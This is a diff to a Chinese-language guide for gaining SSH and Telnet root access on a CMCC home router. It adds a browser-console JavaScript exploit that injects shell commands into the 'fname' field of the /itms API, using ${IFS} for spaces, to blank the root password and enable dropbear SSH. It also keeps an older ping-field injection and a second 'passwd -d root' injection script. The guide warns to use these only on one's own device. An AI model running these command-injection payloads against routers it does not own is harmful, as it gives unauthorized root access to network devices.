@@ -14,6 +14,58 @@
 
 ### 1. 取得 SSH（二选一）
 
+- 方法一（新方法）：
+- 首先进入后台页面 (后台地址、用户名和密码请看路由器背面)
+- 登录后在浏览器控制台执行以下脚本（将 `sessionId` 替换为你自己的值，可在浏览器开发者工具的请求参数或 Cookie 中找到）：
+
+  ```js
+  {
+      const sessionId = "YOUR_SESSION_ID_HERE";   //替换为你的sessionId
+
+
+      const commands = [
+          "passwd -d root",
+          "uci set dropbear.@dropbear[0].PasswordAuth='on'",
+          "uci set dropbear.@dropbear[0].RootPasswordAuth='on'",
+          "uci set dropbear.@dropbear[0].Port='22'",
+          "uci set dropbear.@dropbear[0].enable='1'",
+          "uci commit dropbear",
+          "/etc/init.d/dropbear enable",
+          "/etc/init.d/dropbear start"
+      ];
+
+      const shellCmd = commands.map(cmd => cmd.replace(/ /g, "${IFS}")).join(";"); // 用 ${IFS} 代替空格，适配该接口命令解析
+
+
+      fetch("/itms", {
+          method: "POST",
+          headers: {
+              "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+              cmd: 22,
+              fname: "websys.log |" + shellCmd,
+              method: "get",
+              sessionId: sessionId,
+          }),
+      })
+          .then((response) => response.json())
+          .then((data) => {
+              console.log("服务器返回:", data);
+          })
+          .catch((error) => {
+              console.error("请求失败:", error);
+          });
+  }
+  ```
+
+- 脚本中会将命令里的空格替换为 `${IFS}`，这是为了适配该接口的命令解析方式
+
+- 执行完成后，使用 ssh 连接路由器：`ssh root@192.168.x.x`（root 默认无密码）
+- 联网后系统可能会自动打补丁封禁 22 端口，重置系统即可恢复
+- 参考讨论: <https://www.right.com.cn/forum/forum.php?mod=viewthread&tid=8445553&extra=&page=1>
+
+- 方法二（原方法）：
 - 首先进入后台页面 (后台地址、用户名和密码请看路由器背面)
 - 进入「更多 --> 诊断 --> ping」页面
 - 在”URL或者IP地址”的输入框中输入：`$(dropbear${IFS}-p${IFS}22)` 来启动 dropbear
@@ -22,10 +74,12 @@
 
 #### 同型号提示“无效地址”的处理方法
 
+- ⚠️ 该脚本属于利用漏洞的临时提权手段，请仅在自有设备上使用，勿用于共享或公共网络设备，并确认执行后会清空 root 密码；连接成功后建议立即执行 `passwd root` 设置新密码。
+
 - 打开 Chrome 调试窗口，切换到「网络（Network）」
 - 刷新页面后，找到 `items` 相关的 POST 请求
 - 在「负载（Payload）」中找到 `sessionId` 并记录
-- 切换到「控制台（Console）」，输入以下脚本（注意替换 `sessionId` 和路由器地址；示例中地址为 `cmcc.wifi`，请同步替换 `url` 与下方 SSH 命令中的主机名）：
+- 切换到「控制台（Console）」，输入以下脚本（注意替换示例地址 `cmcc.wifi` 为实际路由器地址，需同步替换 `url` 与下方 SSH 命令中的主机名）：
 
   ```javascript
   var url = "http://cmcc.wifi/itms";
@@ -33,7 +87,7 @@
     cmd: 22,
     fname: "websys.log|passwd -d root",
     method: "get",
-    sessionId: "YOUR_SESSION_ID_HERE"
+    sessionId: "YOUR_SESSION_ID_HERE" // 替换为上述步骤中记录的 sessionId
   };
   var xhr = new XMLHttpRequest();
   xhr.open("POST", url, true);
@@ -56,8 +110,6 @@
   ```bash
   ssh -oHostKeyAlgorithms=+ssh-rsa root@cmcc.wifi
   ```
-
-- ⚠️ 该脚本属于利用漏洞的临时提权手段，请仅在自有设备上使用，勿用于共享或公共网络设备，并确认执行后会清空 root 密码；连接成功后建议立即执行 `passwd root` 设置新密码。
 
 ### 2. 取得 Telnet（二选一）
 
